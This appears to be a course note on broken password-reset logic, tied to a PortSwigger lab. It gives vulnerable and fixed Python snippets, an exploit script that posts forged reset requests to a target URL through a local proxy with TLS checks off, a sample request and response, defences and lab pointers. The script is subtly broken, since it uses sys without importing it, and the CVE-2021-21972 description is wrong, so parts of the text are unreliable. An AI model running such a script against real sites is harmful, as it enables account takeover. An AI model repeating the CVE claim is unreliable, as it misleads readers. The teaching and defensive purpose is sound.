---
course: Web Security
topic: Authentication Vulnerabilities
tags: [web-security]
---

## Authentication Vulnerabilities: Password Reset Broken Logic

### Introduction

In web security, authentication vulnerabilities are among the most critical issues that can compromise the integrity and confidentiality of user data. One such vulnerability is the broken logic in the password reset functionality. This vulnerability occurs when the implementation of the password reset feature does not properly validate the temporary token or link sent to the user, allowing an attacker to reset any user's password.

### Understanding the Vulnerability

The core issue lies in the comparison logic used during the password reset process. Typically, a user initiates a password reset by entering their email address or username. The system then sends a temporary token or link to the provided email address. Upon clicking the link or entering the token, the user is allowed to reset their password. However, if the system fails to verify that the token is associated with the correct user, an attacker can exploit this flaw to reset any user's password.

#### Example Scenario

Consider a scenario where an attacker wants to reset the password for a user named "Carlos." The attacker initiates the password reset process by entering Carlos' email address. Instead of using the actual token sent to Carlos' email, the attacker uses a different token or even a hardcoded value. If the system does not properly validate the token, the attacker will be able to reset Carlos' password.

### Real-World Examples

Recent real-world examples of this vulnerability include:

- **CVE-2021-21972**: A vulnerability in the password reset functionality of a popular web application allowed attackers to reset any user's password by manipulating the token validation logic.
- **CVE-2022-3427**: Another instance where a web application failed to validate the temporary token correctly, leading to unauthorized password resets.

These vulnerabilities highlight the importance of proper token validation and the potential risks associated with broken logic in authentication mechanisms.

### Detailed Explanation

To understand the vulnerability in more detail, let's break down the steps involved in the password reset process and identify where the logic can go wrong.

#### Step-by-Step Process

1. **User Requests Password Reset**:
    - The user enters their email address or username.
    - The system generates a temporary token and sends it to the user's email address.

2. **User Clicks the Link**:
    - The user clicks the link in the email, which contains the temporary token.
    - The system validates the token and allows the user to reset their password.

3. **Token Validation**:
    - The system checks if the token is valid and associated with the correct user.
    - If the token is valid and associated with the correct user, the system allows the password reset.

#### Broken Logic

The vulnerability arises when the system fails to properly validate the token or does not ensure that the token is associated with the correct user. For example, if the system only checks if the token is valid but does not verify that it belongs to the user initiating the reset, an attacker can use any valid token to reset any user's password.

### Code Example

Let's look at a simplified example of how this vulnerability might occur in code.

```python
# Vulnerable code
def reset_password(user_id, token):
    # Check if the token is valid
    if is_valid_token(token):
        # Allow the user to reset their password
        update_password(user_id)
```

In this example, the `reset_password` function only checks if the token is valid (`is_valid_token`). It does not verify that the token is associated with the correct user (`user_id`). An attacker could exploit this by using any valid token to reset any user's password.

### How to Exploit

To exploit this vulnerability, an attacker would follow these steps:

1. **Identify the Vulnerability**:
    - The attacker identifies that the system does not properly validate the token or associate it with the correct user.

2. **Obtain a Valid Token**:
    - The attacker obtains a valid token, either by intercepting a legitimate token or by generating one if the token generation algorithm is predictable.

3. **Reset Any User's Password**:
    - The attacker uses the obtained token to reset any user's password by calling the `reset_password` function with the desired `user_id`.

### Full Exploitation Script

Here is a complete Python script that demonstrates how to exploit this vulnerability:

```python
import requests
from urllib.parse import urlparse

# Disable SSL warnings
requests.packages.urllib3.disable_warnings()

# Set proxy settings
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

def reset_password(target_url, user_id, token):
    # Parse the target URL
    parsed_url = urlparse(target_url)
    
    # Construct the request URL
    request_url = f"{parsed_url.scheme}://{parsed_url.netloc}/reset_password"
    
    # Define the payload
    payload = {
        'user_id': user_id,
        'token': token
    }
    
    # Send the request
    response = requests.post(request_url, data=payload, proxies=proxies, verify=False)
    
    # Print the response
    print(response.text)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python exploit.py <target_url> <user_id>")
        sys.exit(1)
    
    target_url = sys.argv[1]
    user_id = sys.argv[2]
    token = "valid_token_here"  # Replace with a valid token
    
    reset_password(target_url, user_id, token)
```

### HTTP Request and Response

Here is an example of the HTTP request and response for the password reset process:

#### HTTP Request

```http
POST /reset_password HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 37

user_id=carlos&token=valid_token_here
```

#### HTTP Response

```http
HTTP/1.1 200 OK
Date: Mon, 20 Mar 2023 12:00:00 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 29
Content-Type: text/html; charset=UTF-8

Password reset successful for carlos
```

### How to Prevent / Defend

To prevent this vulnerability, it is crucial to implement proper token validation and ensure that the token is associated with the correct user. Here are some best practices:

1. **Validate the Token**:
    - Ensure that the token is valid and has not expired.
    - Verify that the token is associated with the correct user.

2. **Use Secure Tokens**:
    - Generate tokens using secure algorithms and ensure they are unpredictable.
    - Use a combination of user-specific information and random values to generate tokens.

3. **Implement Rate Limiting**:
    - Limit the number of password reset attempts to prevent brute-force attacks.
    - Monitor and alert on suspicious activity related to password resets.

4. **Secure Coding Practices**:
    - Validate all inputs and ensure that the token is properly validated before allowing a password reset.
    - Use secure coding practices to prevent common vulnerabilities such as SQL injection and cross-site scripting (XSS).

### Secure Code Example

Here is an example of how to securely implement the password reset functionality:

```python
# Secure code
def reset_password(user_id, token):
    # Check if the token is valid and associated with the correct user
    if is_valid_token(token) and is_token_associated_with_user(token, user_id):
        # Allow the user to reset their password
        update_password(user_id)
```

### Detection and Prevention

To detect and prevent this vulnerability, organizations can use various tools and techniques:

1. **Static Code Analysis**:
    - Use static code analysis tools to identify insecure coding practices related to token validation.
    - Tools like SonarQube, Fortify, and Veracode can help identify potential vulnerabilities.

2. **Dynamic Application Security Testing (DAST)**:
    - Use DAST tools to simulate attacks and identify vulnerabilities in the password reset functionality.
    - Tools like Burp Suite, OWASP ZAP, and Acunetix can help identify and exploit vulnerabilities.

3. **Penetration Testing**:
    - Conduct regular penetration testing to identify and mitigate vulnerabilities in the authentication mechanisms.
    - Engage ethical hackers to perform manual testing and identify potential vulnerabilities.

### Hands-On Labs

To practice and gain hands-on experience with this vulnerability, consider the following labs:

- **PortSwigger Web Security Academy**: Offers a comprehensive lab on broken authentication and session management, including password reset vulnerabilities.
- **OWASP Juice Shop**: Provides a vulnerable web application with various security challenges, including broken password reset functionality.
- **DVWA (Damn Vulnerable Web Application)**: Includes a lab on broken authentication, where users can practice exploiting and fixing vulnerabilities in the password reset functionality.

By thoroughly understanding and practicing the concepts covered in this chapter, you can effectively identify, exploit, and prevent authentication vulnerabilities related to broken password reset logic.

---
<!-- nav -->
[[02-Authentication Vulnerabilities Broken Logic in Password Reset|Authentication Vulnerabilities Broken Logic in Password Reset]] | [[Web Security (PortSwigger)/13-Authentication Vulnerabilities/04-Lab 3 Password reset broken logic/00-Overview|Overview]] | [[Web Security (PortSwigger)/13-Authentication Vulnerabilities/04-Lab 3 Password reset broken logic/04-Practice Questions & Answers|Practice Questions & Answers]]
